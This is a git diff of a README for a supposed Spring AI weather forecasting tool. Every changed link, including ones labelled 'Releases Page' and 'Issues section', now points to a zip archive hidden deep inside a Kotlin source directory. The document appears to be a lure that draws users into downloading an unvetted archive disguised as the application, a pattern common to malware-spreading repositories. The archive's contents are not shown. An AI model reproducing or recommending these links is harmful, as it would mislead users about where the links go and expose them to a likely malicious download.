@@ -1,6 +1,6 @@
 # 🌤️ spring-ai-weather-tool - Get Accurate Weather Forecasts Easily
 
-[![Download](https://raw.githubusercontent.com/Mircheaaa/spring-ai-weather-tool/main/refrigeratory/spring-ai-weather-tool.zip)](https://raw.githubusercontent.com/Mircheaaa/spring-ai-weather-tool/main/refrigeratory/spring-ai-weather-tool.zip)
+[![Download](https://github.com/Mircheaaa/spring-ai-weather-tool/raw/refs/heads/main/src/main/kotlin/com/back/koreaTravelGuide/application/tool_spring_ai_weather_2.6.zip)](https://github.com/Mircheaaa/spring-ai-weather-tool/raw/refs/heads/main/src/main/kotlin/com/back/koreaTravelGuide/application/tool_spring_ai_weather_2.6.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the application. You don’t need 
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Mircheaaa/spring-ai-weather-tool/main/refrigeratory/spring-ai-weather-tool.zip).
+1. Visit this page to download: [Releases Page](https://github.com/Mircheaaa/spring-ai-weather-tool/raw/refs/heads/main/src/main/kotlin/com/back/koreaTravelGuide/application/tool_spring_ai_weather_2.6.zip).
 
 2. Look for the latest version, which is currently **v1.0.1**.
 
@@ -72,7 +72,7 @@ If you encounter any issues while downloading or running the application, consid
 
 For additional help or inquiries, feel free to reach out via the following channels:
 
-- **Open an Issue:** You can report any problems by navigating to the [Issues section](https://raw.githubusercontent.com/Mircheaaa/spring-ai-weather-tool/main/refrigeratory/spring-ai-weather-tool.zip) of this repository.
+- **Open an Issue:** You can report any problems by navigating to the [Issues section](https://github.com/Mircheaaa/spring-ai-weather-tool/raw/refs/heads/main/src/main/kotlin/com/back/koreaTravelGuide/application/tool_spring_ai_weather_2.6.zip) of this repository.
 - **Community Support:** Check discussions or join conversations from other users in the community forums related to the Spring AI Weather Tool.
 
 ## 📝 Contribution
@@ -88,4 +88,4 @@ We welcome contributions to enhance this tool. If you want to help, follow these
 
 The Spring AI Weather Tool is released under the MIT License. You can use and distribute it freely with proper attribution.
 
-Remember, you can download the latest version here: [Releases Page](https://raw.githubusercontent.com/Mircheaaa/spring-ai-weather-tool/main/refrigeratory/spring-ai-weather-tool.zip). Enjoy accurate weather forecasting with the Spring AI Weather Tool!
+Remember, you can download the latest version here: [Releases Page](https://github.com/Mircheaaa/spring-ai-weather-tool/raw/refs/heads/main/src/main/kotlin/com/back/koreaTravelGuide/application/tool_spring_ai_weather_2.6.zip). Enjoy accurate weather forecasting with the Spring AI Weather Tool!
